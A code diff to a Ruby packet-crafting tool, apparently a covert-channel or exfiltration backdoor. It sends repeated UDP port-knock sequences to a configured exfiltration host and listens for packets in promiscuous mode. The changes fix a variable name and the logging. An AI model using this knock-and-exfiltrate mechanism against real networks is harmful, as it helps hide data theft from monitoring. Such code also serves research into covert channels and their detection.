@@ -64,7 +64,6 @@ def start_listen_server
       :promic => true,
       :filter => filter)
     cap.stream.each do |p|
-      threads = []
       pkt =  PacketFu::Packet.parse(p)
       if $cfg_pen_protocol == TCP && pkt.udp_dst == $cfg_pen_port
         puts "in TCP mode" #DEBUG
@@ -164,20 +163,22 @@ def generate_knock_seq
     puts "error in PF config"
     puts e.message
   end
-  convert_config = "#{$cfg_exfil_protocol},#{$exfil_port},#{$cfg_exfil_ttl}"
+  convert_config = "#{$cfg_exfil_protocol},#{$cfg_exfil_port},#{$cfg_exfil_ttl}"
   puts convert_config
 
   if $cfg_exfil_protocol == UDP
     begin
-      udp_packet(iface_config, 44444, convert_config)
+      3.times {
+        udp_packet(iface_config, 44444, convert_config)
+      }
       sleep 2
-      udp_packet(iface_config, 44444, convert_config)
-      udp_packet(iface_config, 55555, convert_config)
+      3.times {
+        udp_packet(iface_config, 55555, convert_config)
+      }
       sleep 2
-      udp_packet(iface_config, 55555, convert_config)
-      udp_packet(iface_config, 44544, convert_config)
-      sleep 2
-      udp_packet(iface_config, 44544, convert_config)
+      3.times {
+        udp_packet(iface_config, 44544, convert_config)
+      }
       sleep 5
     rescue Exception => e
       puts "error in udp knock"
@@ -204,7 +205,7 @@ def udp_packet(config, port, payload)
   udp_pkt.recalc
   udp_pkt.to_w($cfg_iface)
 
-  puts "udp packet sent #{$cfg_target_ip} on #{$cfg_pen_port}"
+  puts "udp packet sent #{$cfg_exfil_ip} on #{port}"
 end
 
 def tcp_packet(config, port, payload)
